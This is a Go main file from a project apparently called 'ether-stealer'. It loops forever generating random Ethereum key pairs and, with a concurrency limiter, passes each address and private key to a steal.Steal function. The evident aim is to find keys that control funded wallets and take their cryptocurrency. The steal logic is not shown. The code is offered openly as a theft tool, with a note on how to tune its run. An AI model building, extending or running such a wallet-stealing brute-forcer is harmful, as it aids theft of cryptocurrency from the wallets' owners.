package main

import (
	"flag"
	"net"

	"github.com/hexoul/ether-stealer/crypto"
	"github.com/hexoul/ether-stealer/log"
	"github.com/hexoul/ether-stealer/steal"

	"github.com/korovkin/limiter"
)

var (
	nLimit     *int
	identifier *string
)

func init() {
	nLimit = flag.Int("concurrency", 10, "The number of threads can be executed concurrently.")
	identifier = flag.String("identifier", "", "An identifier of a client.")
}

func main() {
	// Starting message
	var ip string
	if addrs, err := net.InterfaceAddrs(); err == nil {
		for _, a := range addrs {
			if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
				ip = ipnet.IP.String()
			}
		}
	}
	log.Info("Steal start!!! from ", ip, " ", *identifier)

	limit := limiter.NewConcurrencyLimiter(*nLimit)
	// If you want to run finite iterator,
	// 1. Add condition to `for` statement like `for i:=0; i<N`
	// 2. Put `limit.Wait()` after `for` statement
	for {
		pubkey, privkey := crypto.GenerateKeyPair()
		addr := crypto.ToAddressFromPubkey(pubkey)
		limit.Execute(func() { steal.Steal(addr, privkey) })
	}
}
